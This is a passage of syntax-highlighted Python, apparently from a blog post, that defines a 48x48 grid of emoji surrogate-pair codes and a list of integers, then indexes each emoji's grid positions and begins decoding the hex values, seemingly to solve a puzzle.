class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span></span><br><span class="line">    ]]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = [<span class="number">25588</span>, <span class="number">31114</span>, <span class="number">28727</span>, <span class="number">26722</span>, <span class="number">24948</span>, <span class="number">25135</span>, <span class="number">25480</span>, <span class="number">29029</span>, <span class="number">23025</span>, <span class="number">25775</span>, <span class="number">15411</span>, <span class="number">25423</span>, <span class="number">25202</span>, <span class="number">30031</span>, <span class="number">27380</span>, <span class="number">30734</span>, <span class="number">25054</span>, <span class="number">25109</span>, <span class="number">20741</span>, <span class="number">28568</span>, <span class="number">28802</span>, <span class="number">24591</span>, <span class="number">26063</span>, <span class="number">30940</span>, <span class="number">30375</span>, <span class="number">19411</span>, <span class="number">29573</span>, <span class="number">20845</span>, <span class="number">27232</span>, <span class="number">26743</span>, <span class="number">25779</span>, <span class="number">24986</span>, <span class="number">31498</span>, <span class="number">30978</span>, <span class="number">22945</span>, <span class="number">26563</span>, <span class="number">35012</span>, <span class="number">29994</span>, <span class="number">27016</span>, <span class="number">29535</span>, <span class="number">21342</span>, <span class="number">26573</span>, <span class="number">27569</span>, <span class="number">25408</span>, <span class="number">31567</span>, <span class="number">25503</span>, <span class="number">21385</span>, <span class="number">27207</span>]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        k = s[i][j]</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> dic:</span><br><span class="line">            dic[k] = []</span><br><span class="line">        dic[k].append((i,j))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> dic.items():</span><br><span class="line">    x,y=k.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    y=<span class="built_in">int</span>(y,<span 